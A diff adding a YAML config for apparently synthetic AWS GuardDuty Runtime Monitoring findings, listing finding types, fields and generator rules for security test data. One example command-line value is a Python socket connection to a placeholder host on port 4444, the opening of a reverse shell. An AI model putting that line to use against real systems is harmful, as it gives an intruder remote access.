@@ -1,0 +1,343 @@
+vendor: aws
+product: guardduty
+data_source: findings
+description: AWS GuardDuty Runtime Monitoring finding types detecting threats based on operating system-level behavior from Amazon EC2 hosts and containers in Amazon EKS clusters, Amazon ECS workloads, and Fargate tasks, including malicious file execution, privilege escalation, container escape, process injection, cryptocurrency mining, command and control activity, and defense evasion techniques
+format: JSON
+frequency: high
+is_generator: true
+base_frequency: 60
+time_patterns:
+  - business_hours
+  - night_hours
+  - weekend
+business_hours_multiplier: 2.0
+night_hours_multiplier: 2.5
+weekend_multiplier: 1.5
+
+documentation:
+  display:
+    title: "GuardDuty Runtime Monitoring Finding Types"
+    subtitle: "Threat detection based on OS-level runtime behavior"
+    icon: "⚡"
+    color_scheme: "error"
+    tags:
+      - "runtime-monitoring"
+      - "process-monitoring"
+      - "container-security"
+      - "threat-detection"
+      - "malware-detection"
+  
+  overview:
+    summary: "Runtime Monitoring analyzes operating system-level behavior from EC2 hosts and containers in EKS, ECS, and Fargate to detect malicious activity including malicious file execution, privilege escalation, container escape, process injection, cryptocurrency mining, command and control communication, Tor network usage, reverse shells, fileless execution, and defense evasion techniques. Uses runtime logs containing process, file, and network activity context."
+    when_generated:
+      - "Cryptocurrency-related IP addresses queried from EC2 instance or container"
+      - "Command and control server communication detected from runtime processes"
+      - "Tor network connections detected (relay or client activity)"
+      - "Blackhole or drop point traffic patterns detected"
+      - "New binary execution detected on instance or container"
+      - "Docker socket accessed for privilege escalation"
+      - "Container escape attempts via runc or CGroups modification"
+      - "Process injection attempts detected (proc, ptrace, virtual memory write)"
+      - "Reverse shell connections initiated from instances or containers"
+      - "Fileless execution detected (code execution without disk writes)"
+      - "Cryptocurrency miner execution detected"
+      - "New libraries loaded into running processes"
+      - "Container mounting host directories detected"
+      - "Suspicious tool or command execution detected"
+      - "Ptrace anti-debugging techniques detected"
+      - "Malicious file execution detected"
+      - "Suspicious shell creation from network services"
+      - "Privilege escalation to root via suspicious setuid execution"
+      - "Kernel module loaded on EC2 instance"
+    security_relevance: "Critical"
+    compliance_frameworks:
+      - "PCI-DSS 11.4, 11.5"
+      - "HIPAA 164.308(a)(1)"
+      - "SOC 2 CC7.2, CC7.4"
+      - "ISO 27001 A.12.4.1, A.12.4.2"
+      - "NIST CSF PR.DS-5, DE.AE-3"
+      - "CIS Docker Benchmark 4.1-4.12"
+      - "NIST SP 800-190"
+    frequency_notes: "Runtime Monitoring findings vary significantly based on workload activity, container usage, and threat landscape. Production environments typically see 20-80 findings per day. Cryptocurrency mining and C&C activity are high-severity but lower frequency (5-20 per day). Process injection, container escape, and privilege escalation are critical but rare (1-10 per day). Suspicious command execution is common but lower severity (10-50 per day). Kernel module loading is very rare but critical (0-2 per day). Frequency increases during active attacks and decreases during quiet periods."
+  
+  fields:
+    - name: "detail.type"
+      type: "String"
+      required: true
+      description: "Runtime Monitoring finding type indicating attack tactic and detection method"
+      example_value: "Execution:Runtime/MaliciousFileExecuted"
+      template_source: "random_choice() of 42 Runtime Monitoring finding types"
+      possible_values:
+        - value: "CryptoCurrency:Runtime/BitcoinTool.B"
+          description: "Instance or container querying IP associated with cryptocurrency activity"
+        - value: "Backdoor:Runtime/C&CActivity.B"
+          description: "Instance or container querying IP associated with known C&C server"
+        - value: "UnauthorizedAccess:Runtime/TorRelay"
+          description: "Instance or container making connections to Tor network as relay"
+        - value: "UnauthorizedAccess:Runtime/TorClient"
+          description: "Instance or container making connections to Tor Guard or Authority node"
+        - value: "Trojan:Runtime/BlackholeTraffic"
+          description: "Blackhole traffic pattern detected"
+        - value: "Trojan:Runtime/DropPoint"
+          description: "DropPoint trojan activity detected"
+        - value: "Execution:Runtime/NewBinaryExecuted"
+          description: "New binary execution detected on instance or container"
+        - value: "PrivilegeEscalation:Runtime/DockerSocketAccessed"
+          description: "Docker socket accessed for privilege escalation"
+        - value: "PrivilegeEscalation:Runtime/RuncContainerEscape"
+          description: "Container escape attempt via runc detected"
+        - value: "PrivilegeEscalation:Runtime/CGroupsReleaseAgentModified"
+          description: "CGroups release agent modified for container escape"
+        - value: "DefenseEvasion:Runtime/ProcessInjection.Proc"
+          description: "Process injection via /proc filesystem detected"
+        - value: "DefenseEvasion:Runtime/ProcessInjection.Ptrace"
+          description: "Process injection via ptrace detected"
+        - value: "Execution:Runtime/ReverseShell"
+          description: "Reverse shell connection detected"
+        - value: "DefenseEvasion:Runtime/FilelessExecution"
+          description: "Fileless execution detected (code execution without disk writes)"
+        - value: "Impact:Runtime/CryptoMinerExecuted"
+          description: "Cryptocurrency miner execution detected"
+        - value: "Execution:Runtime/MaliciousFileExecuted"
+          description: "Known malicious executable file execution detected"
+        - value: "PrivilegeEscalation:Runtime/ElevationToRoot"
+          description: "Privilege escalation to root via suspicious setuid execution"
+        - value: "DefenseEvasion:Runtime/KernelModuleLoaded"
+          description: "Kernel module loaded on EC2 instance indicating kernel-level access attempt"
+    
+    - name: "detail.resource.resourceType"
+      type: "String"
+      required: true
+      description: "Type of resource where runtime activity was detected"
+      example_value: "Instance"
+      template_source: "random_choice(['Instance', 'EKSCluster', 'ECSTask', 'Container'])"
+      possible_values:
+        - value: "Instance"
+          description: "Amazon EC2 instance"
+        - value: "EKSCluster"
+          description: "Amazon EKS cluster"
+        - value: "ECSTask"
+          description: "Amazon ECS task"
+        - value: "Container"
+          description: "Container running on instance or in cluster"
+    
+    - name: "detail.resource.instanceDetails.instanceId"
+      type: "String"
+      required: false
+      description: "EC2 instance identifier (when resourceType is Instance)"
+      example_value: "i-1234567890abcdef0"
+      format: "i-{17 hex characters}"
+      template_source: "random_hex(17, 17) with 'i-' prefix"
+    
+    - name: "detail.resource.containerDetails"
+      type: "Object"
+      required: false
+      description: "Container details (when resourceType is Container or ECSTask)"
+      example_value: "{containerRuntime, id, name, image, securityContext}"
+      template_source: "Container metadata from runtime environment"
+    
+    - name: "detail.service.runtimeDetails.process"
+      type: "Object"
+      required: true
+      description: "Process information that triggered the finding"
+      example_value: "{name, pid, ppid, user, executablePath, commandLine}"
+      template_source: "Process metadata from runtime agent"
+    
+    - name: "detail.service.runtimeDetails.process.name"
+      type: "String"
+      required: true
+      description: "Name of the process executable"
+      example_value: "/usr/bin/python3"
+      format: "Full path to executable"
+      template_source: "Process executable path from runtime agent"
+    
+    - name: "detail.service.runtimeDetails.process.pid"
+      type: "Integer"
+      required: true
+      description: "Process ID (PID) of the process"
+      example_value: "1234"
+      format: "Integer (1-65535)"
+      template_source: "Process ID from operating system"
+    
+    - name: "detail.service.runtimeDetails.process.ppid"
+      type: "Integer"
+      required: true
+      description: "Parent process ID (PPID) of the process"
+      example_value: "1"
+      format: "Integer (1-65535)"
+      template_source: "Parent process ID from operating system"
+    
+    - name: "detail.service.runtimeDetails.process.user"
+      type: "String"
+      required: true
+      description: "User name running the process"
+      example_value: "root"
+      format: "Username"
+      template_source: "User name from process credentials"
+    
+    - name: "detail.service.runtimeDetails.process.userId"
+      type: "Integer"
+      required: true
+      description: "User ID (UID) of the process owner"
+      example_value: "0"
+      format: "Integer (typically 0-65535)"
+      template_source: "User ID from process credentials (0 for root)"
+    
+    - name: "detail.service.runtimeDetails.process.euid"
+      type: "Integer"
+      required: true
+      description: "Effective user ID (EUID) of the process"
+      example_value: "0"
+      format: "Integer (typically 0-65535)"
+      template_source: "Effective user ID from process credentials"
+    
+    - name: "detail.service.runtimeDetails.process.parentName"
+      type: "String"
+      required: true
+      description: "Name of the parent process executable"
+      example_value: "/usr/sbin/sshd"
+      format: "Full path to parent executable"
+      template_source: "Parent process executable path from runtime agent"
+    
+    - name: "detail.service.runtimeDetails.process.executablePath.text"
+      type: "String"
+      required: true
+      description: "Full path to the process executable. Note: File paths may be controlled by malicious actors and should be sanitized when displayed"
+      example_value: "/usr/bin/python3"
+      format: "Absolute file path"
+      template_source: "Executable file path from runtime agent"
+    
+    - name: "detail.service.runtimeDetails.process.executableSha256"
+      type: "String"
+      required: true
+      description: "SHA-256 hash of the executable file"
+      example_value: "a1b2c3d4e5f6..."
+      format: "64-character hexadecimal string"
+      template_source: "SHA-256 hash of executable file content"
+    
+    - name: "detail.service.runtimeDetails.process.commandLine.text"
+      type: "String"
+      required: true
+      description: "Command line used to execute the process. Note: Command lines may be controlled by malicious actors and should be sanitized when displayed"
+      example_value: "python3 -c \"import socket; s=socket.socket(); s.connect((\\\"203.0.113.1\\\", 4444))\""
+      format: "Command line string"
+      template_source: "Process command line arguments from runtime agent"
+    
+    - name: "detail.service.runtimeDetails.process.workingDirectory.text"
+      type: "String"
+      required: true
+      description: "Working directory of the process. Note: File paths may be controlled by malicious actors and should be sanitized when displayed"
+      example_value: "/tmp"
+      format: "Absolute directory path"
+      template_source: "Working directory path from runtime agent"
+    
+    - name: "detail.service.runtimeDetails.context.runtimeContext"
+      type: "Object"
+      required: false
+      description: "Runtime context information including memory regions and address space flags"
+      example_value: "{addressSpaceFlags, memoryRegions, toolName}"
+      template_source: "Runtime context metadata from runtime agent"
+    
+    - name: "detail.service.runtimeDetails.context.runtimeContext.toolName"
+      type: "String"
+      required: false
+      description: "Name of the tool or utility used (for SuspiciousTool findings)"
+      example_value: "curl"
+      format: "Tool name"
+      template_source: "Tool name identified by runtime agent"
+    
+    - name: "detail.service.action.networkConnectionAction.remoteIpDetails.ipAddressV4"
+      type: "String"
+      required: false
+      description: "Remote IP address for network-based findings"
+      example_value: "203.0.113.42"
+      format: "IPv4 address"
+      template_source: "random_public_ip() for network connection findings"
+    
+    - name: "detail.service.action.dnsRequestAction.domain"
+      type: "String"
+      required: false
+      description: "Domain name queried for DNS-based findings"
+      example_value: "guarddutyc2activityb.com"
+      format: "Domain name"
+      template_source: "random_choice() of test and malicious domains for DNS findings"
+    
+    - name: "detail.service.additionalInfo.threatListName"
+      type: "String"
+      required: false
+      description: "Name of threat intelligence list that matched"
+      example_value: "Amazon"
+      format: "Threat list name"
+      template_source: "random_choice() of threat intelligence list names"
+      possible_values:
+        - value: "Amazon"
+          description: "AWS threat intelligence (includes Log4j-related threats)"
+        - value: "ProofPoint"
+          description: "ProofPoint threat intelligence feed"
+        - value: "Custom Threat List"
+          description: "Custom user-defined threat list"
+        - value: "AWS Threat Intelligence"
+          description: "AWS managed threat intelligence"
+        - value: "Community Threat List"
+          description: "Community-maintained threat list"
+    
+    - name: "detail.service.additionalInfo.threatName"
+      type: "String"
+      required: false
+      description: "Name of the specific threat identified"
+      example_value: "C&C Server"
+      format: "Threat name"
+      template_source: "random_choice() of threat names"
+      possible_values:
+        - value: "C&C Server"
+          description: "Command and control server"
+        - value: "Bitcoin Mining"
+          description: "Cryptocurrency mining activity"
+        - value: "Tor Network"
+          description: "Tor network node"
+        - value: "Log4j Related"
+          description: "Log4j vulnerability exploitation"
+        - value: "Malicious Binary"
+          description: "Known malicious executable"
+        - value: "Container Escape"
+          description: "Container escape technique"
+    
+    - name: "detail.severity"
+      type: "Integer"
+      required: true
+      description: "Finding severity level (0-10)"
+      example_value: "8"
+      template_source: "random_choice([2, 2, 5, 5, 5, 8, 8, 8])"
+      possible_values:
+        - value: "2"
+          description: "Low severity (1.0-3.9) - e.g., SuspiciousShellCreated, Discovery:Runtime/SuspiciousCommand"
+        - value: "5"
+          description: "Medium severity (4.0-6.9) - e.g., ElevationToRoot, Persistence:Runtime/SuspiciousCommand"
+        - value: "8"
+          description: "High severity (7.0-8.9) - e.g., MaliciousFileExecuted, C&CActivity, TorClient, KernelModuleLoaded"
+  
+  resources:
+    documentation:
+      - title: "Runtime Monitoring Finding Types"
+        url: "https://docs.aws.amazon.com/guardduty/latest/ug/findings-runtime-monitoring.html"
+        type: "official"
+      - title: "Remediating Runtime Monitoring Findings"
+        url: "https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_runtime.html"
+        type: "official"
+      - title: "GuardDuty Runtime Monitoring"
+        url: "https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_runtime_monitoring.html"
+        type: "official"
+      - title: "Runtime Agent Installation"
+        url: "https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_runtime-agent.html"
+        type: "official"
+    tools:
+      - name: "AWS GuardDuty Console"
+        description: "Web interface for viewing and managing Runtime Monitoring findings"
+        url: "https://console.aws.amazon.com/guardduty/"
+      - name: "AWS Security Hub"
+        description: "Centralized security findings including GuardDuty Runtime Monitoring findings"
+        url: "https://aws.amazon.com/security-hub/"
+      - name: "AWS Systems Manager"
+        description: "Install and manage GuardDuty runtime agents"
+        url: "https://aws.amazon.com/systems-manager/"
+
